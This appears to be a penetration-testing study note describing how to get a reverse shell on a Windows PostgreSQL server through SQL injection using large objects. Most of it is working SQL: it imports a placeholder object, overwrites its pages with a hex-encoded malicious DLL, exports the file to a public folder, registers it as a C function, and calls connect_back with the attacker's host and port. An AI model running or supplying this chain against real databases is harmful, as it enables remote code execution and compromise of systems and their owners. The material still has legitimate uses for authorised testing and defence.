# Reverse Shell 3b: Postgres Large Objects

Large objects are used for storing data that would be difficult to handle in its entirety, such as an image or PDF document. Data held in large objects can be **exported** back to file system as **identical copy** of original imported file (unlike `copy to`).

- To use large objects, DBAdmin privileges are required.

As such, we can create a large object that will hold our binary payload (custom DLL), export the large object to the remote server file system as an alternative to using a file share. 

Large objects are created by calling the `lo_import` function with the path of the file and an optional parameter for the `loid`, which is used to reference our large object. We can also use `\lo_list` and `\lo_unlink <id>`to interact with large objects.  

- LO import also creates item metadata required for exporting (hence we should simply import object from arbitrary file rather than create new object)

```sql
select lo_import('C:\\Windows\\win.ini', 1821);
-- C:\Windows\win.ini is a file that always exists
```

We can similarly export a specific large object into the file system

```sql
select lo_export(1821, 'C:\\Windows\\new_win.ini');
```

Updating large objects (which are stored in the `pg_largeobjects` table. Objects are stored in `2kb` chunks, and can be iterated through based on their page number. 

```sql
update pg_largeobject set data=decode($$xxxxx$$, $$hex$$) where loid=<loid> and pageno=0;
```

## Creating LO reverse shell

1. Create malicious DLL
2. Inject query that creates large object from arbitrary file
3. Inject query to update page 0 of LO with first 2KB of DLL
4. Inject queries that insert additional pages into `pg_largeobject` with remainder of DLL
5. Inject query that exports DLL onto remote file system
6. Inject query that creates Postgres UDF with exported DLL
7. Inject query that executes newly created UDF

```sql
-- Step 1:
-- Reference: https://stackoverflow.com/questions/3964245/convert-file-to-hex-string-python
with open(udf_filename, 'rb') as f:
		content = f.read()
udf = binascii.hexlify(content).decode('utf-8')

-- Step 2:
SELECT lo_unlink ({loid})
SELECT lo_import($$C:\\windows\\win.ini$$, {loid})

-- Step 3:
UPDATE pg_largeobject SET data=decode($${hex_string}$$,$$hex$$)
WHERE loid={loid} AND pageno=0"

-- Step 4:
-- Reference: https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES 
({loid}, {i}, decode($${hex_string}$$, $$hex$$))

-- Step 5:
SELECT lo_export({loid}, $$C:\\Users\\Public\\connect_back.dll$$)

-- Step 6:
CREATE OR REPLACE FUNCTION connect_back(text, integer)
RETURNS void AS $$C:\\Users\\Public\\connect_back.dll$$,
$$connect_back$$ LANGUAGE C STRICT

-- Step 7:
SELECT connect_back($${LHOST}$$, {LPORT})
```

## LO Encoding

The data column of `pg_largeobject` holds data in the binary string `bytea` format. Based on [postgres](Reverse%20Shell%203b%20Postgres%20Large%20Objects%20b1bc2235bedf414eb3ebb233d3429f0f.md) documentation, this supports hex encoding of target data for importing and exporting. As such, we convert our malicious DLL into a hex string.

Each byte is represented with 2 hexadecimal digits. Each 2 characters will be a representation of a single raw bytes (hex representation will double the size of original file).

Each page of LO object holds 2,048 bytes of raw data. Each 4096 characters of hex encoding will represent 2KB, which will be the chunk size when injecting payload.